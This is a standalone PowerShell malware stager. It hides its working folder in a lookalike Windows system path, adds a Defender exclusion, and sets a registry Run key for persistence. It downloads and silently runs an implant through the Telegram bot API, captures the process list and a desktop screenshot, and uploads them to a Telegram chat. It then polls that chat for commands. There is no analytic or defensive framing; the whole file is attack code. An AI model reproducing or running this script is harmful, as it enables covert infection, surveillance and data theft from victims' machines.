$ErrorActionPreference = "SilentlyContinue"
$stage = "C:\Windows \SysWOW64"
$implant = Join-Path $stage "telemetryhost.exe"
$archive = Join-Path $stage "capture.zip"
$botToken = "1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghi"
$chatId = "-1002468135790"
$api = "https://api.telegram.org/bot$botToken"

New-Object System.Threading.Mutex($true, "Global\update-session-6f28c1", [ref]$createdNew) | Out-Null
New-Item -ItemType Directory -Force -Path $stage | Out-Null
Add-MpPreference -ExclusionPath $stage
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemTelemetry" -Value $implant -PropertyType String -Force | Out-Null

$metadata = Invoke-RestMethod -Uri "$api/getFile?file_id=$remoteFile"
$downloadUrl = "https://api.telegram.org/file/bot$botToken/$($metadata.result.file_path)"
Invoke-WebRequest -Uri $downloadUrl -OutFile $implant
Start-Process -FilePath $implant -WindowStyle Hidden

Get-Process | Select-Object Name, Id, Path | ConvertTo-Json | Set-Content (Join-Path $stage "processes.json")
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bitmap.Save((Join-Path $stage "desktop.png"))

Compress-Archive -Path (Join-Path $stage "processes.json"),(Join-Path $stage "desktop.png") -DestinationPath $archive -Force
Invoke-RestMethod -Uri "$api/sendDocument" -Method Post -Form @{chat_id=$chatId; document=Get-Item $archive}

while ($true) {
    $updates = Invoke-RestMethod -Uri "$api/getUpdates?timeout=45"
    Start-Sleep -Seconds 5
}
